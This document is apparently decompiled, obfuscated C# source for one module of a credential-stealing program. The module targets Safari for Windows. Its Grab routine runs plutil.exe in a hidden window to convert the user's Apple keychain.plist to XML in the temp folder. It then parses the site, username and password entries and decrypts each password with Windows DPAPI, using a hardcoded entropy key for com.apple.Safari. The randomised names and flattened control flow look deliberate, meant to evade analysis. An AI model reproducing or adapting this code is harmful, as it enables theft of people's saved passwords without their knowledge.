using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class JNms : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string Hn5n11dIGUE
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public JNms()
	{
		Hn5n11dIGUE = "Safari for Windows";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			string n7tpx = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Common Files\\Apple\\Apple Application Support\\plutil.exe";
			string dT8Va3KWi = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Apple Computer\\Preferences\\keychain.plist";
			string G8g9R = null;
			if (!QgoaKCYjNL(n7tpx, dT8Va3KWi, ref G8g9R))
			{
				return null;
			}
			return q0yLy(G8g9R.Remove(G8g9R.Length - 2));
		}
		catch
		{
			return new List<ii68>();
		}
	}

	private List<ii68> q0yLy(string YgaoHX3g48)
	{
		int num = 0;
		int num2 = default;
		string[] array = default;
		string input = default;
		string input2 = default;
		List<ii68> list = default;
		while (true)
		{
			if (num == 5)
			{
				num2 = 0;
				num = 6;
			}
			if (num == 4)
			{
				array = Regex.Split(input, "<dict>");
				num = 5;
			}
			if (num == 3)
			{
				input = Regex.Split(input2, "<array>")[1];
				num = 4;
			}
			if (num == 1)
			{
				input2 = File.ReadAllText(YgaoHX3g48);
				num = 2;
			}
			if (num == 8)
			{
				num2++;
				num = 9;
			}
			if (num == 2)
			{
				list = new List<ii68>();
				num = 3;
			}
			if (num == 9)
			{
				goto IL_0112;
			}
			goto IL_012a;
			IL_01ec:
			if (num == 6)
			{
				goto IL_0112;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 10)
			{
				break;
			}
			continue;
			IL_012a:
			if (num == 7)
			{
				goto IL_013b;
			}
			goto IL_01ec;
			IL_013b:
			list.Add(new ii68
			{
				oVAe = Hn5n11dIGUE,
				byIdLuuGZbL = b4v.jCFtRv(array[num2], "<string>", "</string>", 5),
				S8v = b4v.jCFtRv(array[num2], "<string>", "</string>", 0),
				_9H5rP7hg2 = _63N7Q6(Convert.FromBase64String(b4v.jCFtRv(array[num2], "<data>", "</data>", 0)))
			});
			num = 8;
			goto IL_01ec;
			IL_0112:
			if (num2 >= array.Length)
			{
				num = 10;
				goto IL_012a;
			}
			goto IL_013b;
		}
		return list;
	}

	private string _63N7Q6(byte[] yQjRh4pz)
	{
		int num = 0;
		byte[] array = default;
		byte[] array2 = default;
		do
		{
			if (num == 1)
			{
				array = new byte[144]
				{
					29, 172, 168, 248, 211, 184, 72, 62, 72, 125,
					62, 10, 98, 7, 221, 38, 230, 103, 129, 3,
					231, 178, 19, 165, 176, 121, 238, 79, 15, 65,
					21, 237, 123, 20, 140, 229, 75, 70, 13, 193,
					142, 254, 214, 231, 39, 117, 6, 139, 73, 0,
					220, 15, 48, 160, 158, 253, 9, 133, 241, 200,
					170, 117, 193, 8, 5, 121, 1, 226, 151, 216,
					175, 128, 56, 96, 11, 113, 14, 104, 83, 119,
					47, 15, 97, 246, 29, 142, 143, 92, 178, 61,
					33, 116, 64, 75, 181, 6, 110, 171, 122, 189,
					139, 169, 126, 50, 143, 110, 6, 36, 217, 41,
					164, 165, 190, 38, 35, 253, 238, 241, 76, 15,
					116, 94, 88, 251, 145, 116, 239, 145, 99, 111,
					109, 46, 97, 112, 112, 108, 101, 46, 83, 97,
					102, 97, 114, 105
				};
				num = 2;
			}
			if (num == 2)
			{
				array2 = ProtectedData.Unprotect(yQjRh4pz, array, (DataProtectionScope)0);
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 3);
		return Encoding.UTF8.GetString(array2, 4, array2.Length - 4);
	}

	private bool QgoaKCYjNL(string n7tpx8, string DT8Va3KWi, ref string G8g9R)
	{
		int num = 0;
		do
		{
			if (num == 2)
			{
				if (File.Exists(n7tpx8))
				{
					break;
				}
				num = 3;
			}
			switch (num)
			{
			case 3:
				return false;
			case 1:
				G8g9R = null;
				num = 2;
				break;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		Process process = new Process();
		process.StartInfo.FileName = n7tpx8;
		process.StartInfo.Arguments = " -convert xml1 -s -o \"" + nAPiN4eo(ref G8g9R, Path.GetTempPath() + "\\fixed_keychain.xml\" ") + "\"" + DT8Va3KWi + "\"";
		process.StartInfo.CreateNoWindow = true;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.Start();
		process.WaitForExit();
		return process.StandardOutput.ReadToEnd().Length == 0;
	}

	private string nAPiN4eo(ref string FiA0g3ejO, string fy4GvQxd)
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				FiA0g3ejO = fy4GvQxd;
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		return fy4GvQxd;
	}
}
